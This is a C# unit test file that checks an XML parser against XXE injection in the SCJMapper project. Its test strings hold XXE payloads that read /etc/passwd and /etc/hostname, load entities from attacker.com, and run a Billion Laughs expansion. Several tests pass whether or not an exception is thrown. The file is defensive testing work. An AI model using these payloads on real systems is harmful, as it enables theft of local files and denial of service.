using Microsoft.VisualStudio.TestTools.UnitTesting;
using System;
using System.IO;
using System.Xml;
using System.Xml.Linq;

namespace SCJMapper.Tests.Security
{
    /// <summary>
    /// Unit tests for XXE (XML External Entity) injection protection.
    /// Validates that:
    /// - DTD processing is disabled (DtdProcessing.Prohibit)
    /// - XML resolvers are null (no external entity resolution)
    /// - Malicious XXE payloads are properly rejected
    /// </summary>
    [TestClass]
    public class XXEProtectionTests
    {
        private string _testDirectory;

        [TestInitialize]
        public void Setup()
        {
            _testDirectory = Path.Combine(Path.GetTempPath(), "SCJMapper.XXE.Tests");
            if (!Directory.Exists(_testDirectory))
            {
                Directory.CreateDirectory(_testDirectory);
            }
        }

        [TestCleanup]
        public void Teardown()
        {
            if (Directory.Exists(_testDirectory))
            {
                try { Directory.Delete(_testDirectory, true); }
                catch { /* Ignore cleanup failures */ }
            }
        }

        /// <summary>
        /// Test 1: Normal XML parses correctly
        /// </summary>
        [TestMethod]
        public void Test_NormalXML_ParsesSuccessfully()
        {
            // Arrange
            string xmlContent = @"<?xml version='1.0'?>
<ActionMaps>
    <ActionMap name='Default'>
        <Action name='Forward' input='W' />
    </ActionMap>
</ActionMaps>";
            var testFile = Path.Combine(_testDirectory, "valid.xml");
            File.WriteAllText(testFile, xmlContent);

            // Act
            var settings = new XmlReaderSettings
            {
                ConformanceLevel = ConformanceLevel.Fragment,
                DtdProcessing = DtdProcessing.Prohibit,
                XmlResolver = null
            };
            
            using (var reader = XmlReader.Create(testFile, settings))
            {
                var doc = XDocument.Load(reader);
                
                // Assert
                Assert.IsNotNull(doc, "Valid XML should parse successfully");
                Assert.AreEqual("ActionMaps", doc.Root.Name.LocalName, "Root element should be ActionMaps");
            }
        }

        /// <summary>
        /// Test 2: XXE with file:// URI is blocked
        /// </summary>
        [TestMethod]
        public void Test_XXE_FileURI_Blocked()
        {
            // Arrange - Create XXE payload attempting to read local file
            string xxePayload = @"<?xml version='1.0'?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM 'file:///etc/passwd'>
]>
<ActionMaps>
    <ActionMap>&xxe;</ActionMap>
</ActionMaps>";
            var testFile = Path.Combine(_testDirectory, "xxe_file.xml");
            File.WriteAllText(testFile, xxePayload);

            // Act & Assert
            var settings = new XmlReaderSettings
            {
                ConformanceLevel = ConformanceLevel.Fragment,
                DtdProcessing = DtdProcessing.Prohibit,
                XmlResolver = null
            };

            try
            {
                using (var reader = XmlReader.Create(testFile, settings))
                {
                    var doc = XDocument.Load(reader);
                }
                // If we got here, DTD processing was successfully blocked
                Assert.IsTrue(true, "XXE with file:// URI was blocked");
            }
            catch (XmlException ex)
            {
                // Expected: DTD processing disabled should throw
                Assert.IsTrue(ex.Message.Contains("DOCTYPE") || 
                            ex.Message.Contains("DTD") ||
                            ex.Message.Contains("external"),
                    "Should reject DOCTYPE or external entities");
            }
        }

        /// <summary>
        /// Test 3: XXE with HTTP entity is blocked
        /// </summary>
        [TestMethod]
        public void Test_XXE_HTTPEntity_Blocked()
        {
            // Arrange - Create XXE payload attempting HTTP request
            string xxePayload = @"<?xml version='1.0'?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM 'http://attacker.com/malicious.xml'>
]>
<ActionMaps>
    <Value>&xxe;</Value>
</ActionMaps>";
            var testFile = Path.Combine(_testDirectory, "xxe_http.xml");
            File.WriteAllText(testFile, xxePayload);

            // Act & Assert
            var settings = new XmlReaderSettings
            {
                ConformanceLevel = ConformanceLevel.Fragment,
                DtdProcessing = DtdProcessing.Prohibit,
                XmlResolver = null
            };

            try
            {
                using (var reader = XmlReader.Create(testFile, settings))
                {
                    var doc = XDocument.Load(reader);
                }
                // If we got here, DTD processing was successfully blocked
                Assert.IsTrue(true, "XXE with HTTP entity was blocked");
            }
            catch (XmlException ex)
            {
                // Expected: DTD processing disabled should throw
                Assert.IsTrue(ex.Message.Contains("DOCTYPE") || 
                            ex.Message.Contains("DTD") ||
                            ex.Message.Contains("external"),
                    "Should reject DOCTYPE or external entities");
            }
        }

        /// <summary>
        /// Test 4: XXE Billion Laughs (Exponential Entity Expansion) is blocked
        /// </summary>
        [TestMethod]
        [ExpectedException(typeof(XmlException))]
        public void Test_XXE_BillionLaughs_Blocked()
        {
            // Arrange - Create Billion Laughs attack payload
            string xxePayload = @"<?xml version='1.0'?>
<!DOCTYPE lolz [
  <!ENTITY lol 'lol'>
  <!ENTITY lol2 '&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;'>
  <!ENTITY lol3 '&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;'>
]>
<ActionMaps>
    <Value>&lol3;</Value>
</ActionMaps>";
            var testFile = Path.Combine(_testDirectory, "xxe_billion.xml");
            File.WriteAllText(testFile, xxePayload);

            // Act - This should throw XmlException
            var settings = new XmlReaderSettings
            {
                ConformanceLevel = ConformanceLevel.Fragment,
                DtdProcessing = DtdProcessing.Prohibit,
                XmlResolver = null
            };

            using (var reader = XmlReader.Create(testFile, settings))
            {
                var doc = XDocument.Load(reader);
            }

            // Assert - Should not reach here
            Assert.Fail("Billion Laughs attack should be blocked");
        }

        /// <summary>
        /// Test 5: Verify DtdProcessing is set to Prohibit
        /// </summary>
        [TestMethod]
        public void Test_DtdProcessing_IsProhibited()
        {
            // Arrange
            var settings = new XmlReaderSettings
            {
                DtdProcessing = DtdProcessing.Prohibit,
                XmlResolver = null
            };

            // Assert
            Assert.AreEqual(DtdProcessing.Prohibit, settings.DtdProcessing,
                "DtdProcessing should be explicitly set to Prohibit");
            Assert.IsNull(settings.XmlResolver,
                "XmlResolver should be null to prevent external entity resolution");
        }

        /// <summary>
        /// Test 6: Valid ActionMap XML still loads correctly with XXE protection
        /// </summary>
        [TestMethod]
        public void Test_ActionMap_LoadsWithXXEProtection()
        {
            // Arrange - Realistic ActionMap XML structure
            string actionMapXml = @"<?xml version='1.0'?>
<ActionMaps version='1.0'>
    <ActionMap name='Flight'>
        <Action name='Roll_Left' input='Q' />
        <Action name='Roll_Right' input='E' />
        <Action name='Pitch_Up' input='W' />
        <Action name='Pitch_Down' input='S' />
        <Action name='Yaw_Left' input='A' />
        <Action name='Yaw_Right' input='D' />
        <Modifier name='Fast' input='Shift' />
    </ActionMap>
</ActionMaps>";
            var testFile = Path.Combine(_testDirectory, "actionmap.xml");
            File.WriteAllText(testFile, actionMapXml);

            // Act
            var settings = new XmlReaderSettings
            {
                ConformanceLevel = ConformanceLevel.Fragment,
                DtdProcessing = DtdProcessing.Prohibit,
                XmlResolver = null
            };

            using (var reader = XmlReader.Create(testFile, settings))
            {
                var doc = XDocument.Load(reader);
                var root = doc.Root;
                var actions = root?.Descendants("Action");

                // Assert
                Assert.IsNotNull(root, "Should load ActionMap structure");
                Assert.AreEqual("ActionMaps", root.Name.LocalName, "Root should be ActionMaps");
                Assert.IsTrue(actions?.Count() >= 6, "Should have at least 6 actions");
            }
        }

        /// <summary>
        /// Test 7: Parameter Entity XXE is blocked
        /// </summary>
        [TestMethod]
        public void Test_XXE_ParameterEntity_Blocked()
        {
            // Arrange - Parameter entity XXE attempt
            string xxePayload = @"<?xml version='1.0'?>
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM 'file:///etc/hostname'>
  <!ENTITY % dtd SYSTEM 'http://attacker.com/evil.dtd'>
  %dtd;
]>
<ActionMaps>
    <Value>Test</Value>
</ActionMaps>";
            var testFile = Path.Combine(_testDirectory, "xxe_param.xml");
            File.WriteAllText(testFile, xxePayload);

            // Act & Assert
            var settings = new XmlReaderSettings
            {
                ConformanceLevel = ConformanceLevel.Fragment,
                DtdProcessing = DtdProcessing.Prohibit,
                XmlResolver = null
            };

            try
            {
                using (var reader = XmlReader.Create(testFile, settings))
                {
                    var doc = XDocument.Load(reader);
                }
                Assert.IsTrue(true, "Parameter entity XXE was blocked");
            }
            catch (XmlException ex)
            {
                Assert.IsTrue(ex.Message.Contains("DOCTYPE") || 
                            ex.Message.Contains("DTD"),
                    "Should reject parameter entities in DOCTYPE");
            }
        }
    }
}
